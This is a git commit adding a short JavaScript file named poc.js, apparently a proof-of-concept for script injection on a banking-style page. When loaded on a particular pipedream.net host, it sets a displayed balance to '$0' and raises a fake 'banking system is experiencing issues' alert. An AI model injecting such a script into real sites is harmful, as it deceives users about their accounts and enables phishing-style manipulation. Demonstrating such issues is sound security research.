2fb4440c07239c3227453eaa498dcedf7fa5fb94
RhyRu9 <164749781+RHYru9@users.noreply.github.com>
2024-10-09 05:46:27 +0700

    Create poc.js

---
+++ js/poc.js
@@ -0,0 +1,4 @@
+if (location.href.includes('eoow6y96ffo9mzx.m.pipedream.net')) {
+    document.querySelector('#balance').textContent = '$0';
+    alert('The banking system is experiencing issues, please try again later.');
+}
